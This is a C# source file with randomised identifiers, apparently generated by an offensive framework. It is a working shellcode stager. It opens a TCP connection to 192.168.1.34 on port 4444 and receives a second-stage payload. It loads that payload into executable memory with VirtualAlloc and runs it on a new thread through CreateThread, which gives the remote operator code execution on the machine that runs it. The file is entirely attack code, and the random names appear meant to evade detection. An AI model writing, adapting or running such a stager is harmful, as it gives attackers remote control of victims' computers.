using System;
using System.Net;
using System.Threading;
using System.Net.Sockets;
using System.Runtime.InteropServices;
namespace oIroQHrrGylQGQ
{
    class bMkMXIQKvshIUh
    {
        static byte[] OtqiHYWupUdSQUR(string lLrKuUvsHLhkv, int jLWPbjZ)
        {
            IPEndPoint NEQPzlIg = new IPEndPoint(IPAddress.Parse(lLrKuUvsHLhkv), jLWPbjZ);
            Socket HzPWgYsOmqhEH = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            try
            {
                HzPWgYsOmqhEH.Connect(NEQPzlIg);
            }
            catch
            {
                return null;
            }
            byte[] WmbrCn = new byte[4];
            HzPWgYsOmqhEH.Receive(WmbrCn, 4, 0);
            int dNyHjypRkSjuvD = BitConverter.ToInt32(WmbrCn, 0);
            byte[] cQwcJkCwSymYFxz = new byte[dNyHjypRkSjuvD + 5];
            int rXAlTZnzoPDi = 0;
            while (rXAlTZnzoPDi < dNyHjypRkSjuvD)
            {
                rXAlTZnzoPDi += HzPWgYsOmqhEH.Receive(cQwcJkCwSymYFxz, rXAlTZnzoPDi + 5, (dNyHjypRkSjuvD - rXAlTZnzoPDi) < 4096 ? (dNyHjypRkSjuvD - rXAlTZnzoPDi) : 4096, 0);
            }
            byte[] FMbEEgTLzdeNq = BitConverter.GetBytes((int)HzPWgYsOmqhEH.Handle);
            Array.Copy(FMbEEgTLzdeNq, 0, cQwcJkCwSymYFxz, 1, 4); cQwcJkCwSymYFxz[0] = 0xBF;
            return cQwcJkCwSymYFxz;
        }
        static void dsmkBEmkHv(byte[] aptjjnVZK)
        {
            if (aptjjnVZK != null)
            {
                UInt32 yJhwRUydDPf = VirtualAlloc(0, (UInt32)aptjjnVZK.Length, 0x1000, 0x40);
                Marshal.Copy(aptjjnVZK, 0, (IntPtr)(yJhwRUydDPf), aptjjnVZK.Length);
                IntPtr srdRecoaq = IntPtr.Zero;
                UInt32 AFxdECKUFldX = 0;
                IntPtr ktakwyDDgWW = IntPtr.Zero;
                srdRecoaq = CreateThread(0, 0, yJhwRUydDPf, ktakwyDDgWW, 0, ref AFxdECKUFldX);
                WaitForSingleObject(srdRecoaq, 0xFFFFFFFF);
            }
        }
        static void Main()
        {
            byte[] yhoLtKZHQMsW = null;
            yhoLtKZHQMsW = OtqiHYWupUdSQUR("192.168.1.34", 4444);
            dsmkBEmkHv(yhoLtKZHQMsW);
        }
        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 hrQsLyuklQaNVE, UInt32 FcxEdCCJws, UInt32 ILIxYzboqICT, UInt32 FanIGUDCoB);
        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(UInt32 FYfeXksYDO, UInt32 FxFhOEeBA, UInt32 YnjUxZh, IntPtr ffNSYlRbdUeN, UInt32 dSzgeGTERKoK, ref UInt32 mbZyMt);
        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(IntPtr XNJVDXZZtsRgZ, UInt32 PzafTWITkPANO);
    }
}
